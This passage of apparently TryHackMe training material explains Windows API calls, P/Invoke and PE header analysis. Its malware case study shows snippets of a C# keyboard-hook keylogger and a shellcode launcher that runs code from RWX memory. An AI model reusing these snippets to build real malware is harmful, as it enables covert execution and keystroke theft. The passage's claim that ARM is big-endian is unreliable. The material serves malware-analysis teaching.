these implementations work, and in future tasks, we will put them to 
practical use.

# Windows Header File

Microsoft
 has released the Windows header file, also known as the Windows loader,
 as a direct solution to the problems associated with ASLR’s 
implementation. Keeping the concept at a high level, at runtime, the 
loader will determine what calls are being made and create a thunk table
 to obtain function addresses or pointers.

Luckily, we do not have to dive deeper than that to continue working with API calls if we do not desire to do so.

Once the `windows.h` file is included at the top of an unmanaged program; any Win32 function can be called.

We will cover this concept at a more practical level in task 6.

# P/Invoke

Microsoft
 describes P/Invoke or platform invoke as “a technology that allows you 
to access structs, callbacks, and functions in unmanaged libraries from 
your managed code.”

P/invoke provides tools to handle the entire 
process of invoking an unmanaged function from managed code or, in other
 words, calling the Win32 API. P/invoke will kick off by importing the 
desired DLL that contains the unmanaged function or Win32 API call. Below is an example of importing a DLL with options.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
}
```

In the above code, we are importing the DLL `user32` using the attribute: `DLLImport`.

Note:
 a semicolon is not included because the p/invoke function is not yet 
complete. In the second step, we must define a managed method as an 
external one. The `extern` keyword will inform the runtime of the specific DLL that was previously imported. Below is an example of creating the external method.

```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
}
```

Now we can invoke the function as a managed method, but we are calling the unmanaged function!

**API Call Structure**

API
 calls are the second main component of the Win32 library. These calls 
offer extensibility and flexibility that can be used to meet a plethora 
of use cases. Most Win32 API calls are well documented under the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and [pinvoke.net](http://pinvoke.net/).

In this task, we will take an introductory look at naming schemes and in/out parameters of API calls.

API
 call functionality can be extended by modifying the naming scheme and 
appending a representational character. Below is a table of the 
characters Microsoft supports for its naming scheme.

| **Character** | **Explanation** |
| --- | --- |
| A | Represents an 8-bit character set with ANSI encoding |
| W | Represents a Unicode encoding |
| Ex | Provides extended functionality or in/out parameters to the API call |

For more information about this concept, check out the [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings).

---

Each
 API call also has a pre-defined structure to define its in/out 
parameters. You can find most of these structures on the corresponding 
API call document page of the [Windows documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list), along with explanations of each I/O parameter.

Let’s take a look at the `WriteProcessMemory` API call as an example. Below is the I/O structure for the call obtained [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

```

For each I/O parameter, Microsoft also explains its use, expected input or output, and accepted values.

Even with an explanation determining these values can sometimes 
be challenging for particular calls. We suggest always researching and 
finding examples of API call usage before using a call in your code.

**C API Implementations**

Microsoft
 provides low-level programming languages such as C and C++ with a 
pre-configured set of libraries that we can use to access needed API calls.

The `windows.h`
 header file, as discussed in task 4, is used to define call structures 
and obtain function pointers. To include the windows header, prepend the
 line below to any C or C++ program.

`#include <windows.h>`

Let’s jump right into creating our first API call. As our first objective, we aim to create a pop-up window with the title: “Hello THM!” using `CreateWindowExA`. To reiterate what was covered in task 5, let’s observe the in/out parameters of the call.

```cpp
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);

```

Let’s take these pre-defined parameters and assign values to them. As mentioned in task 5, each parameter for an API call has an explanation of its purpose and potential values. Below is an example of a complete call to `CreateWindowsExA`.

```cpp
HWND hwnd = CreateWindowsEx(
	0,
	CLASS_NAME,
	L"Hello THM!",
	WS_OVERLAPPEDWINDOW,
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
	NULL,
	NULL,
	hInstance,
	NULL
	);

```

We’ve defined our first API call in C! Now we can implement it into an application and use the functionality of the API call. Below is an example application that uses the API to create a small blank window.

```cpp
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }

```

If successful, we should see a window with the title “Hello THM!”.

As demonstrated throughout this task, low-level languages make it very easy to define an API
 call quickly. Because of the ease of use and extensibility, C-based 
languages are the most popular among threat actors and vendors alike.

**.NET and PowerShell API Implementations**

As discussed in task 4, **P/Invoke** allows us to import DLLs and assign pointers to API calls.

To
 understand how P/Invoke is implemented, let’s jump right into it with 
an example below and discuss individual components afterward.

```cpp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

```

The class function stores defined API calls and a definition to reference in all future methods.

The library in which the API call structure is stored must now be imported using `DllImport`.
 The imported DLLs act similar to the header packages but require that 
you import a specific DLL with the API call you are looking for. You can
 reference the [API index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) or [pinvoke.net](http://pinvoke.net/) to determine where a particular API call is located in a DLL.

From the DLL import, we can create a new pointer to the API call we want to use, notably defined by `intPtr`.
 Unlike other low-level languages, you must specify the in/out parameter
 structure in the pointer. As discussed in task 5, we can find the 
in/out parameters for the required API call from the Windows documentation.

Now we can implement the defined API call into an application and use its functionality. Below is an example application that uses the API to get the computer name and other information of the device it is run on.

```csharp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}

```

If successful, the program should return the computer name of the current device.

Now that we’ve covered how it can be accomplished in .NET let’s look at how we can adapt the same syntax to work in PowerShell.

Defining the API
 call is almost identical to .NET’s implementation, but we will need to 
create a method instead of a class and add a few additional operators.

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;

```

The calls are now defined, but PowerShell requires one further step before they can be initialized. We must create a new type for the pointer of each Win32 DLL within the method definition. The function `Add-Type` will drop a temporary file in the `/temp` directory and compile needed functions using `csc.exe`. Below is an example of the function being used.

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;

```

We can now use the required API calls with the syntax below.

`[Win32.Kernel32]::<Imported Call>()`

**Commonly Abused API Calls**

Several API calls within the Win32 library lend themselves to be easily leveraged for malicious activity.

Several entities have attempted to document and organize all available API calls with malicious vectors, including [SANs](https://www.sans.org/white-papers/33649/) and [MalAPI.io](http://malapi.io/).

While many calls are abused, some are seen in the wild more than others. Below is a table of the most commonly abused API organized by frequency in a collection of samples.

| **API Call** | **Explanation** |
| --- | --- |
| LoadLibraryA | Maps a specified DLL
 into the address space of the calling process |
| GetUserNameA | Retrieves the name of the user associated with the current thread |
| GetComputerNameA | Retrieves a NetBIOS or DNS
 name of the local computer |
| GetVersionExA | Obtains information about the version of the operating system currently running |
| GetModuleFileNameA | Retrieves the fully qualified path for the file of the specified module and process |
| GetStartupInfoA | Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process) |
| GetModuleHandle | Returns a module handle for the specified module if mapped into the calling process's address space |
| GetProcAddress | Returns the address of a specified exported DLL
 function |
| VirtualProtect | Changes the protection on a region of memory in the virtual address space of the calling process |

In the next task, we will take a deep dive into how these calls are abused in a case study of two malware samples.

**Malware Case Study**

Now that we understand the underlying implementations of the Win32 library and commonly abused API calls, let’s break down two malware samples and observe how their calls interact.

In this task, we will be breaking down a C# keylogger and shellcode launcher.

# Keylogger

To begin analyzing the keylogger, we need to collect which API
 calls and hooks it is implementing. Because the keylogger is written in
 C#, it must use P/Invoke to obtain pointers for each call. Below is a 
snippet of the p/invoke definitions of the malware sample source code.

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();

```

Below is an explanation of each API call and its respective use.

| **API Call** | **Explanation** |
| --- | --- |
| SetWindowsHookEx | Installs a memory hook into a hook chain to monitor for certain events |
| UnhookWindowsHookEx | Removes an installed hook from the hook chain |
| GetModuleHandle | Returns a module handle for the specified module if mapped into the calling process's address space |
| GetCurrentProcess | Retrieves a pseudo handle for the current process. |

To
 maintain the ethical integrity of this case study, we will not cover 
how the sample collects each keystroke. We will analyze how the sample 
sets a hook on the current process. Below is a snippet of the hooking 
section of the malware sample source code.

```csharp
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```

Let’s understand the objective and procedure of the keylogger, then assign their respective API call from the above snippet.

Using the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and
 the context of the above snippet, begin analyzing the keylogger, using 
questions 1 - 4 as a guide to  work through the sample.

# Shellcode Launcher

To begin analyzing the shellcode launcher, we once again need to collect which API
 calls it is implementing. This process should look identical to the 
previous case study. Below is a snippet of the p/invoke definitions of 
the malware sample source code.

```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

```

Below is an explanation of each API call and its respective use.

| **API Call** | **Explanation** |
| --- | --- |
| VirtualAlloc | Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. |
| WaitForSingleObject | Waits until the specified object is in the signaled state or the time-out interval elapses |
| CreateThread | Creates a thread to execute within the virtual address space of the calling process |

We will now analyze how the shellcode is written to and executed from memory.

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;

```

Let’s understand the objective and procedure of shellcode execution, then assign their respective API call from the above snippet.

Using the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)
 and the context of the above snippet, begin analyzing the shellcode 
launcher, using questions 5 - 8 as a guide to  work through the sample.

## **DISSECTING PE HEADERS**

**Overview of PE headers**

On
 disk, a PE executable looks the same as any other form of digital data,
 i.e., a combination of bits. If we open a PE file in a Hex editor, we 
will see a random bunch of Hex characters. This bunch of Hex characters 
are the instructions a Windows OS needs to execute this binary file.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fccde9cd91c3f9c590f1c295c24c3db7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fccde9cd91c3f9c590f1c295c24c3db7.png)

In the upcoming tasks, we will try to make sense of the Hex numbers 
we see in the above screenshot and describe them as Windows understands 
them. We will also explore how to leverage this information for malware 
analysis. We will use the `wxHexEditor` utility, present in the next task's attached VM to perform this task.

As we view the file in a Hex editor, we observe that manually 
interpreting all this data might become too tedious. Therefore, we will 
use a tool `pe-tree` in the attached VM to help us analyze the PE header. This is what we see when we open a PE file using `pe-tree`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1b5ee018dd56753682a480e83a0789f2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1b5ee018dd56753682a480e83a0789f2.png)

In the right pane here, we see some tree-structure dropdown menus. 
The left pane is just shortcuts to the dropdown menus of the right pane.
 Some of the important headers that we will discuss in this room are:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/39c3ef15076edd83f829d6631f746db7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/39c3ef15076edd83f829d6631f746db7.png)

- IMAGE_DOS_HEADER
- IMAGE_NT_HEADERS
    - FILE_HEADER
    - OPTIONAL_HEADER
    - IMAGE_SECTION_HEADER
    - IMAGE_IMPORT_DESCRIPTOR

All of these headers are of the data type [STRUCT](https://docs.microsoft.com/en-us/cpp/cpp/struct-cpp?view=msvc-170).
 A struct is a user-defined data type that combines several different 
types of data elements in a single variable. Since it is user-defined, 
we need to see the documentation to understand the type for each STRUCT 
variable. The documentation for each header can be found on [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32), where you can find the data types of the different fields inside these headers.

Please
 remember that while we use the tools mentioned earlier, various other 
tools perform similar tasks. However, the goal is not to learn about the
 tools but instead the PE format so that we can perform the same analysis using any other tools we come across, providing the same functionality.

**IMAGE_DOS_HEADER and DOS_STUB**

For
 this task, we will need to use the attached VM. For this purpose, press
 the 'Start Machine' button on the top-right corner of this task to 
start the attached machine. The machine will start in a split-screen 
view. In case the machine is not visible, use the blue Show Split View 
button at the top-right of the page. Alternatively, you can log in to 
the machine using the following credentials:

Username: ubuntu

Password: 123456

Once the machine starts, we can find that there is a directory on the Desktop of the machine named `Samples`. In this directory, we will find a few PE files. Let's open the file named `redline` in a Hex editor to see what it looks like. We can use the `wxHexEditor` utility in the attached VM to open the required file. To open the `wxHexEditor`, press the menu on the top left corner of the VM and search for `wxHexEditor`, as shown in the following screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fbd77920a094646aeacded6adbbba39b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fbd77920a094646aeacded6adbbba39b.png)

This is what the redline PE will look like in the Hex Editor.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6499c16cb26e5920b8b27a19aaa29941.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6499c16cb26e5920b8b27a19aaa29941.png)

Since it seems a little too complex to comprehend, let's use the help of the `pe-tree` utility to see what the PE header looks like. If we run the following command in the terminal in the attached VM, it will open the redline PE file in the `pe-tree` utility.

`pe-tree Desktop/Samples/redline`

Please note that the pe-tree utility will take roughly 8 minutes to 
open. In the meanwhile, you can continue reading the text and come back 
once it has opened. This is what the `pe-tree` output will look like when we open the redline utility.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0c8ad5e3ec38bfc8c0e92dceaf839453.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0c8ad5e3ec38bfc8c0e92dceaf839453.png)

The
 above screenshot shows some basic information about the PE file in the 
right-hand pane. We see the size, hashes, Entropy, architecture, and 
compiled date of the PE file. This information is not extracted directly
 from the header; instead, it is calculated or extracted from different 
parts of the header, as we will see later. The header starts below this 
information, with the heading IMAGE_DOS_HEADER. Let's dive into that and
 learn what information that contains.

### The IMAGE_DOS_HEADER:

The IMAGE_DOS_HEADER consists of the first 64 bytes of the PE
 file. We will analyze some of the valuable information found in the 
IMAGE_DOS_HEADER below. The below screenshot has the IMAGE_DOS_HEADER 
highlighted in the Hex Editor.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5a5864011a51bcfc1b363ce611a442e0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5a5864011a51bcfc1b363ce611a442e0.png)

In the screenshot above from the Hex Editor, notice the first two bytes that say `4D 5A`. They translate to the `MZ` characters in ASCII, as shown in the right pane of the Hex Editor. So what do these characters mean?

The MZ characters denote the initials of [Mark Zbikowski](https://en.wikipedia.org/wiki/Mark_Zbikowski), one of the Microsoft architects who created the MS-DOS
 file format. The MZ characters are an identifier of the Portable 
Executable format. When these two bytes are present at the start of a 
file, the Windows OS considers it a Portable Executable format file.

This is what it will look like when we expand the IMAGE_DOS_HEADER dropdown menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6d224a8f8c9c26e4fa55e370c3a72e83.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6d224a8f8c9c26e4fa55e370c3a72e83.png)

Notice the first entry in the IMAGE_DOS_HEADER dropdown menu. It says `e_magic` and has a value of `0x5a4d MZ`. This is the same as what we saw in the Hex Editor above, but the byte order is reversed due to [endianness](https://en.wikipedia.org/wiki/Endianness). The Intel x86 architecture uses a little-endian format, while ARM uses a big-endian format.

The last value in the IMAGE_DOS_HEADER is called `e_lfanew`. In the above screenshot, it has a value of `0x000000d8`. This denotes the address from where the IMAGE_NT_HEADERS start. Therefore, in this PE file, the IMAGE_NT_HEADERS start from the address `0x000000d8`. We can see this value highlighted in the Hex editor below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/09c62b15ce903944f53962218d6edb7b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/09c62b15ce903944f53962218d6edb7b.png)

We
 have to remember that the byte order is switched when we compare those 
reported by the pe-tree utility and those we see in the Hex editor due 
to [endianness](https://en.wikipedia.org/wiki/Endianness).

The
 IMAGE_DOS_HEADER is generally not of much use apart from these fields, 
especially during malware reverse engineering. The only reason it's 
there is backward compatibility between MS-DOS and Windows.

### The DOS_STUB:

In the pe-tree utility, we see that the following dropdown menu after
 IMAGE_DOS_HEADER is the DOS STUB. Let's expand that and see what we 
find in there.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/18f747097659d0b3dcb1802e1acf9ed5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/18f747097659d0b3dcb1802e1acf9ed5.png)

The DOS STUB contains the message that we also see in the Hex Editor `!This program cannot be run in DOS mode`, as seen in the screenshot below. Please note that the size, hashes, and Entropy shown here by pe-tree are not related to the PE
 file; instead, it is for the particular section we are analyzing. These
 values are calculated based on the data in a specific header and are 
not included.

The size value 
denotes the size of the section in bytes. Then we see different hashes 
for the section. We learned about hashes in the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis) room.
 Entropy is the amount of randomness found in data. The higher the value
 of Entropy, the more random the data is. We will learn about the 
utility of Entropy as we learn more about malware analysis.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3e7684e862ccf5aaf9a4c6ff77902941.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3e7684e862ccf5aaf9a4c6ff77902941.png)

The DOS
 STUB is a small piece of code that only runs if the PE file is 
incompatible with the system it is being run on. It displays the message
 mentioned above. For example, since this PE file we are examining is a 
Windows executable, if it is run in MS-DOS, the PE file will exit after showing the message in the DOS STUB.

**IMAGE_NT_HEADERS**

The rest of the room will focus on the different parts of IMAGE_NT_HEADERS. We can find details of IMAGE_NT_HEADERS in [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32). This header contains most of the vital information related to the PE file. In pe-tree, this is how the IMAGE_NT_HEADERS look like:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/48f2264530712e1b95f9c33a045e7280.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/48f2264530712e1b95f9c33a045e7280.png)

### NT_HEADERS:

Before diving into the details of NT_HEADERS, let's get an overview of the NT_HEADERS. The NT_HEADERS consist of the following:

- Signature
- FILE_HEADER
- OPTIONAL_HEADER

We will cover the Signature and FILE_HEADER in this task but the OPTIONAL_HEADER in the next task.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/789c5ae8f388915dba6bb270ea150417.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/789c5ae8f388915dba6bb270ea150417.png)

The starting address of IMAGE_NT_HEADERS is found in `e_lfanew` from the IMAGE_DOS_HEADER. In the redline binary, we saw that this address was `0x000000D8`. So let's start by going to this offset and see what we find there. We can do that by pressing `Ctrl+G` in the Hex Editor Window or going to Edit>Go to offset from the GUI.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2e48d199ce61126eaaa044d92b1e76ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2e48d199ce61126eaaa044d92b1e76ce.png)

We have to make sure that we select `From beginning` in `Type of branch` option at the bottom and the data type is set to `Hex` for correct results.

### Signature:

The first 4 bytes of the NT_HEADERS consist of the Signature. We can see this as the bytes `50 45 00 00` in Hex, or the characters `PE` in ASCII as shown in the Hex editor.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0bc06e3daa1791e1b5eac1508722340f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0bc06e3daa1791e1b5eac1508722340f.png)

The Signature denotes the start of the NT_HEADER. Apart from the 
Signature, the NT_HEADER contains the FILE_HEADER and the 
IMAGE_OPTIONAL_HEADER.

### FILE_HEADER:

The FILE_HEADER contains some vital information. The following screenshot shows the FILE_HEADER as shown in the pe-tree utility.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/cf2ee70d7ee10420c451c498b6f032bd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/cf2ee70d7ee10420c451c498b6f032bd.png)

As we can see in the above screenshot, the FILE_HEADER has the following fields:

- *Machine:* This field mentions the type of architecture for which the PE file is written. In the above example, we can see that the architecture is i386 which means that this PE file is compatible with 32-bit Intel architecture.
- *NumberOfSections:* A PE file contains different sections where code, variables, and other
resources are stored. This field of the IMAGE_FILE_HEADER mentions the
number of sections the PE file has. In our case, the PE file has five sections. We will learn about sections later in the room.
- *TimeDateStamp:* This field contains the time and date of the binary compilation.
- *PointerToSymbolTable and NumberOfSymbols:* These fields are not generally related to PE files. Instead, they are here due to the COFF file headers.
- *SizeOfOptionalHeader:* This field contains the size of the optional header, which we will learn
about in the next task. In our case, the size is 224 bytes.
- *Characteristics:* This is another critical field. This field mentions the different characteristics of a PE file. In our case, this field tells us that the PE file has stripped relocation information, line numbers, and local
symbol information. It is an executable image and compatible with a
32-bit machine.

While we looked at the FILE_HEADER using the
 pe-tree utility, we can see that the hex values for each field are also
 shown in the pe-tree utility. Can you look at the Hex editor and find 
where each value is located?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bad83e7c23e147df71693bd2495de6fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bad83e7c23e147df71693bd2495de6fa.png)

We are starting to learn to read Hex now, aren't we? To learn more about the FILE_HEADER, you can check out [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header) for it.

**OPTIONAL_HEADER**

The
 OPTIONAL_HEADER is also a part of the NT_HEADERS. It contains some of 
the most important information present in the PE headers. Let's see what
 it looks like in the pe-tree utility.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b817fe43c18f2b3df9e6534bbbc58504.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b817fe43c18f2b3df9e6534bbbc58504.png)

In the Hex editor, the OPTIONAL_HEADER starts right after the end of 
the FILE_HEADER. Below you can see the start of the OPTIONAL_HEADER of 
the redline binary in the Hex Editor.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3eb8d5f8b3382ac6d6b42d33353a7f9b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3eb8d5f8b3382ac6d6b42d33353a7f9b.png)

Let's learn about some of the critical fields in the OPTIONAL_HEADER.

- *Magic:* The Magic number tells whether the PE file is a 32-bit or 64-bit application. If the value is 0x010B, it
denotes a 32-bit application; if the value is 0x020B, it represents a
64-bit application. The above screenshot of the Hex Editor shows the
highlighted bytes, which show the magic of the loaded PE file. Since the value is 0x010B, it shows that it is a 32-bit application.
- *AddressOfEntryPoint:* This field is significant from a
malware analysis/reverse-engineering point of view. This is the address
from where Windows will begin execution. In other words, the first
instruction to be executed is present at this address. This is a
Relative Virtual Address (RVA), meaning it is at an offset relative to
the base address of the image (ImageBase) once loaded into memory.
- BaseOfCode and BaseOfData: These are the addresses of the code and data sections, respectively, relative to ImageBase.
- *ImageBase:* The ImageBase is the preferred loading
address of the PE file in memory. Generally, the ImageBase for .exe
files is 0x00400000, which is also the case for our PE file. Since
Windows can't load all PE files at this preferred address, some relocations are in order when the file is loaded in memory. These relocations are then performed relative to the ImageBase.
- *Subsystem:* This represents the Subsystem required to
run the image. The Subsystem can be Windows Native, GUI (Graphical User
Interface), CUI (Commandline User Interface), or some other Subsystem.
The screenshot above from the pe-tree utility shows that the Subsystem
is 0x0002, representing Windows GUI Subsystem. We can find the complete
list in [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32).
- *DataDirectory:* The DataDirectory is a structure that contains import and export information of the PE file (called Import Address Table and Export Address Table). This information is handy as it gives a glimpse of what the PE file might be trying to do. We will expand on the import information later in this room.

Though there is more information in the OPTIONAL_HEADER, we will not go into those in this room. If you want to learn more about the OPTIONAL_HEADER, you can check out [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32) about this header.

**IMAGE_SECTION_HEADER**

The data that a PE
 file needs to perform its functions, like code, icons, images, User 
Interface elements, etc., are stored in different Sections. We can find 
information about these Sections in the IMAGE_SECTION_HEADER. In the 
pe-tree utility, the IMAGE_SECTION_HEADER is shown for each separate 
section, as can be seen in the below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b04d2037e904b5f777b1721d6d55f92a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b04d2037e904b5f777b1721d6d55f92a.png)

As we can see, the IMAGE_SECTION_HEADER has different sections, namely `.text`, `.rdata`, `.data`, `.ndata` and `.rsrc`. Before moving to the information present in the header of each section, let's learn about the commonly found sections in a PE file.

- *.text:* The .text section is generally the section that contains executable code
for the application. We can see above that the Characteristics for this
section include CODE, EXECUTE and READ, meaning that this section
contains executable code, which can be read but can't be written to.
- *.data:* This section contains initialized data of the application. It has READ/WRITE permissions but doesn't have EXECUTE permissions.
- .*rdata/.idata:* These sections often contain the import information of the PE file. Import information helps a PE file import functions from other files or Windows API.
- .ndata: The .ndata section contains uninitialized data.
- *.reloc:* This section contains relocation information of the PE file.
- *.rsrc:* The resource section contains icons, images, or other resources required for the application UI.

Now
 that we know what the different types of sections are commonly found in
 a PE file, let's see what important information the section headers for
 each section include:

- *VirtualAddress:* This field indicates this section's Relative Virtual Address (RVA) in the memory.
- *VirtualSize:* This field indicates the section's size once loaded into the memory.
